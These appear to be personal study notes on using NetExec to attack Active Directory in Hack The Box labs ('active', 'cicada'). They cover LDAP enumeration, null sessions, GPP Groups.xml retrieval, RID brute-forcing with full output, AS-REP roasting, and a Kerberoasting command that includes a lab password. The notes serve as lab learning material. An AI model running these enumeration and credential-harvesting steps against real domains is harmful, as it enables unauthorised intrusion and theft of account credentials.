for active directory

nxc ldap ...
nxc smb ...
nxc winrm ...
nxc rdp ...

run all of them, but in this specific order:

- **LDAP First:** 
  to Map the domain
  Use your credentials against the DC to find _where_ else your user might have access or to find _new_ users to target.

- **SMB/WinRM next:** 
  to get a shell / access
  Check if your credentials give you administrative access to the workstations.

- **RDP Last:** Only use RDP if you are stuck and need to see the GUI, or if you need to bypass certain restrictions that only apply to command-line shells.


```
nxc ldap <Target_IP_or_Range> -u < Username > -p < Password > [ Flags/Modules ]

```
geared toward querying the Active Directory database rather than just testing login credentials

to see what information the LDAP server (the Domain Controller) can provide, use these flags:

- **`--users`**: Lists all users in the domain.
    
- **`--groups`**: Lists all groups.
    
- **`--active-users`**: Filters for users that are not disabled.
    
- **`--trusted-for-delegation`**: Finds users/computers with unconstrained delegation (a major attack vector).

#### Password & Policy Info

- **`--pass-pol`**: Checks the domain password policy (lockout threshold, minimum length).
    
- **`--asreproast <output_file>`**: Finds users with "Do not require Kerberos pre-authentication" enabled and saves hashes for cracking.
    
- **`--kerberoasting <output_file>`**: Performs Kerberoasting against Service Principal Names (SPNs).
  
  
  **Domain Flag**: Sometimes NXC needs help knowing which domain to query. If it fails, add the `-d` flag, example: 
  `nxc ldap 10.0.2.x -u username -p 'password' -d activedirectory.local --users`

**Anonymous Bind**: Before we have credentials,  try a "Null Session" or anonymous bind to see if the DC is misconfigured: `nxc ldap < DC-IP > -u '' -p ''`

----

nxc smb 10.129.13.84 -u '' -p '' -M spider_plus

after running nxc smb with -M spider_plus

grep the path to Groups.xml

then do 
smb get

need to output file else will see the Error opening 


grep -i "Groups.xml" /home/lanc3/.nxc/modules/nxc_spider_plus/10.129.13.84.json
        "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml": {



```
smb: \> get "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml"
Error opening local file active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
smb: \> 
smb: \> get "active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml" groups.xml

getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as groups.xml (8.5 KiloBytes/sec) (average 8.5 KiloBytes/sec)
smb: \> 

```



find . -name "groups.xml"

refer to HTB/active


-------

## netexec smb 10.129.231.149 -u 'guest' -p '' --rid-brute

example: in cicada (HTB)

```
netexec smb 10.129.231.149 -u 'guest' -p '' --rid-brute
SMB         10.129.231.149  445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)                                                                                                                                           
SMB         10.129.231.149  445    CICADA-DC        [+] cicada.htb\guest: 
SMB         10.129.231.149  445    CICADA-DC        498: CICADA\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        500: CICADA\Administrator (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        501: CICADA\Guest (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        502: CICADA\krbtgt (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        512: CICADA\Domain Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        513: CICADA\Domain Users (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        514: CICADA\Domain Guests (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        515: CICADA\Domain Computers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        516: CICADA\Domain Controllers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        517: CICADA\Cert Publishers (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        518: CICADA\Schema Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        519: CICADA\Enterprise Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        520: CICADA\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        521: CICADA\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        522: CICADA\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        525: CICADA\Protected Users (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        526: CICADA\Key Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        527: CICADA\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        553: CICADA\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        571: CICADA\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        572: CICADA\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        1000: CICADA\CICADA-DC$ (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1101: CICADA\DnsAdmins (SidTypeAlias)
SMB         10.129.231.149  445    CICADA-DC        1102: CICADA\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        1103: CICADA\Groups (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        1104: CICADA\john.smoulder (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1105: CICADA\sarah.dantelia (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1106: CICADA\michael.wrightson (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1108: CICADA\david.orelious (SidTypeUser)
SMB         10.129.231.149  445    CICADA-DC        1109: CICADA\Dev Support (SidTypeGroup)
SMB         10.129.231.149  445    CICADA-DC        1601: CICADA\emily.oscars (SidTypeUser)

```

------

## nxc ldap keberoasting module
--kerberoasting

nxc ldap 10.129.13.84 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -d active.htb --kerberoasting output.txt

hint: need to edit /etc/hosts

otherwise will have errors

